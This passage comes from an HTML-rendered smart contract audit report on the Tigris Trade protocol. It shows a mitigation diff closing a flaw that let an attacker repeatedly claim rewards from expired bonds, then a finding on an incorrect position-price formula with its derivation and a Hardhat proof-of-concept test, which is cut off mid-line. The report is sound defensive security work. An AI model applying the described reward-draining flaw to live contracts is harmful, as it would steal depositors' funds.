class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk12\">totalShares</span><span class=\"mtk1\">[</span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">] -= </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">shares</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">-            (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_claimAmount</span><span class=\"mtk1\">,) = </span><span class=\"mtk11\">claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+            (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_claimAmount</span><span class=\"mtk1\">,) = </span><span class=\"mtk11\">_claim</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             </span><span class=\"mtk12\">amount</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">_claimAmount</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">asset</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -</span><span class=\"mtk7\">157</span><span class=\"mtk1\">,</span><span class=\"mtk7\">8</span><span class=\"mtk1\"> +</span><span class=\"mtk7\">157</span><span class=\"mtk1\">,</span><span class=\"mtk7\">9</span><span class=\"mtk1\"> @@ </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BondNFT</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ERC721Enumerable</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Ownable</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk11\">_burn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Release</span><span class=\"mtk1\">(</span><span class=\"mtk12\">asset</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lockAmount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_owner</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     </span><span class=\"mtk3\">/**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">-     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Claim rewards from a bond</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Claim rewards from an unexpired bond</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">      * </span><span class=\"mtk4\">@dev</span><span class=\"mtk3\"> Should only be called by a manager contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">      * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk3\"> ID of the bond to claim rewards from</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">      * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">_claimer</span><span class=\"mtk3\"> address claiming rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">@@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">     function claim(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">         uint _id,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">         address _claimer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+    ) public onlyManager() returns(uint amount, address tigAsset) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+        Bond memory bond = idToBond(_id);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+        require(!bond.expired, &quot;expired&quot;);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+        return _claim(_id, _claimer);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+    /**</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+     * </span><span class=\"mtk4\">@notice</span><span class=\"mtk3\"> Claim rewards from a releasing bond or an unexpired bond</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk3\"> ID of the bond to claim rewards from</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+     * </span><span class=\"mtk4\">@param</span><span class=\"mtk3\"> </span><span class=\"mtk12\">_claimer</span><span class=\"mtk3\"> address claiming rewards</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+     * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> amount amount of tigAsset claimed</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+     * </span><span class=\"mtk4\">@return</span><span class=\"mtk3\"> tigAsset tigAsset token address</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">+     */</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_claim</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_id</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">+        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_claimer</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyManager</span><span class=\"mtk1\">() </span><span class=\"mtk11\">returns</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tigAsset</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk12\">Bond</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">bond</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">idToBond</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_id</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_claimer</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">bond</span><span class=\"mtk1\">.</span><span class=\"mtk12\">owner</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;!owner&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/170\">TriHaz (Tigris Trade) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/170#issuecomment-1383192458\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The warden has shown how, due to an inconsistent implementation of Bond State change, how they could repeatedly claim rewards for an expired bond, stealing value from all other depositors.</p>\n<p>Because the findings doesn’t just deny yield to others, but allows a single attacker to seize the majority of the yield rewards, leveraging a broken invariant, I agree with High Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/170#issuecomment-1407494699\">GainsGoblin (Tigris Trade) resolved</a>:</strong></p>\n<blockquote>\n<p>Mitigation: <a href=\"https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174442\">https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419174442</a> </p>\n</blockquote>\n<hr>\n<h2 id=\"h-06-incorrect-calculation-of-new-price-while-adding-position\" style=\"position:relative;\"><a href=\"#h-06-incorrect-calculation-of-new-price-while-adding-position\" aria-label=\"h 06 incorrect calculation of new price while adding position permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/236\">[H-06] Incorrect calculation of new price while adding position</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-tigris-findings/issues/236\">KingNFT</a></em></p>\n<p>The formula used for calculating <code>_newPrice</code> in <code>addToPosition()</code> function of Trading.sol is not correct, users will lose part of their funds/profit while using this function.</p>\n<p>The wrong formula</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;</span></span></code></pre>\n<p>The correct formula is</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price);</span></span></code></pre>\n<p>Why this works?</p>\n<p>Given</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">P1 = _trade.price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">P2 = _price</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">P = _newPrice</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">M1 = _trade.margin</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">M2 = _addMargin</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">M =  M1 + M2 = _newMargin</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">L = _trade.leverage</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">U1 = M1 * L  = old position in USD</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">U2 = M2 * L = new position in USD</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">U = U1 + U2 = total position in USD</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">E1 = U1 / P1 = old position of base asset, such as ETH, of the pair</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">E2 = U2 / P2 = new position of base asset of the pair</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">E = E1 + E2 = total position of base asset of the pair</span></span></code></pre>\n<p>Then</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">P = U / E</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  = (U1 + U2) / (E1 + E2)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  = (M1 * L + M2 * L) / (U1 / P1 + U2 / P2)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  = P1 * P2 * (M1 * L + M2 * L) / (U1 * P2 + U2 * P1)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  = P1 * P2 * (M1 + M2) * L / (M1 * L * P2 + M2 * L * P1)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  = P1 * P2 * (M1 + M2) * L / [(M1 * P2 + M2 * P1) * L]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  = P1 * P2 * M / (M1 * P2 + M2 * P1)</span></span></code></pre>\n<p>proven.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The following test case shows two examples that users lose some funds due to adding a new position whenever their existing position is in profit or loss state.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">const { expect } = require(&quot;chai&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { deployments, ethers, waffle } = require(&quot;hardhat&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { parseEther, formatEther } = ethers.utils;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const { signERC2612Permit } = require(&#39;eth-permit&#39;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">const exp = require(&quot;constants&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">describe(&quot;Incorrect calculation of new margin price while adding position&quot;, function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let owner;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let user;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node2;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let node3;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let proxy;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let Trading;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let trading;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let TradingExtension;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let tradingExtension;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let TradingLibrary;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let tradinglibrary;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let StableToken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let stabletoken;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let StableVault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let stablevault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let position;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let pairscontract;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let referrals;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let permitSig;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let permitSigUsdc;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let MockDAI;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let mockdai;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let MockUSDC;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let mockusdc;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let badstablevault;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  let chainlink;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  beforeEach(async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await deployments.fixture([&#39;test&#39;]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    StableToken = await deployments.get(&quot;StableToken&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    stabletoken = await ethers.getContractAt(&quot;StableToken&quot;, StableToken.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    Trading = await deployments.get(&quot;Trading&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    trading = await ethers.getContractAt(&quot;Trading&quot;, Trading.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await trading.connect(owner).setMaxWinPercent(5e10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TradingExtension = await deployments.get(&quot;TradingExtension&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tradingExtension = await ethers.getContractAt(&quot;TradingExtension&quot;, TradingExtension.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const Position = await deployments.get(&quot;Position&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    position = await ethers.getContractAt(&quot;Position&quot;, Position.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockDAI = await deployments.get(&quot;MockDAI&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mockdai = await ethers.getContractAt(&quot;MockERC20&quot;, MockDAI.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    MockUSDC = await deployments.get(&quot;MockUSDC&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    mockusdc = await ethers.getContractAt(&quot;MockERC20&quot;, MockUSDC.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const PairsContract = await deployments.get(&quot;PairsContract&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    pairscontract = await ethers.getContractAt(&quot;PairsContract&quot;, PairsContract.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const Referrals = await deployments.get(&quot;Referrals&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    referrals = await ethers.getContractAt(&quot;Referrals&quot;, Referrals.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    StableVault = await deployments.get(&quot;StableVault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    stablevault = await ethers.getContractAt(&quot;StableVault&quot;, StableVault.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await stablevault.connect(owner).listToken(MockDAI.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await stablevault.connect(owner).listToken(MockUSDC.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(&quot;1&quot;));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node2.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await tradingExtension.connect(owner).setNode(node3.address, true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await network.provider.send(&quot;evm_setNextBlockTimestamp&quot;, [2000000000]);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await network.provider.send(&quot;evm_mine&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const BadStableVault = await ethers.getContractFactory(&quot;BadStableVault&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    badstablevault = await BadStableVault.deploy(StableToken.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    const ChainlinkContract = await ethers.getContractFactory(&quot;MockChainlinkFeed&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    chainlink = await ChainlinkContract.deploy();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    TradingLibrary = await deployments.get(&quot;TradingLibrary&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    tradinglibrary = await ethers.getContractAt(&quot;TradingLibrary&quot;, TradingLibrary.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    await trading.connect(owner).setLimitOrderPriceRange(1e10);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  describe(&quot;Initial margin $500, leverage 2x, position $1000, price $1000&quot;, function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let orderId;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    let initPrice = parseEther(&quot;1000&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    beforeEach(async function () {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      // To simpliy the problem, set fees to 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.setFees(true, 0, 0, 0, 0, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.setFees(false, 0, 0, 0, 0, 0);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let TradeInfo = [parseEther(&quot;500&quot;), MockDAI.address, StableVault.address, parseEther(&quot;2&quot;), 1, true, parseEther(&quot;0&quot;), parseEther(&quot;0&quot;), ethers.constants.HashZero];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let message = ethers.utils.keccak256(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        ethers.utils.defaultAbiCoder.encode(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [&#39;address&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;uint256&#39;, &#39;bool&#39;],</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">          [node.address, 1, initPrice, 0, 2000000000, false]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        )</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let sig = await node.signMessage(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        Buffer.from(message.substring(2), &#39;hex&#39;)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      orderId = await position.getCount();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(await position.assetOpenPositionsLength(1)).to.equal(1);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let trade = await position.trades(orderId);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      let marginAfterFee = trade.margin;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(marginAfterFee.eq(parseEther(&#39;500&#39;))).to.equal(true);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(trade.price.eq(parseEther(&#39;1000&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      expect(trade.leverage.eq(parseEther(&#39;2&#39;))).to.be.true;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    });</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    it.only(&quot;Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual 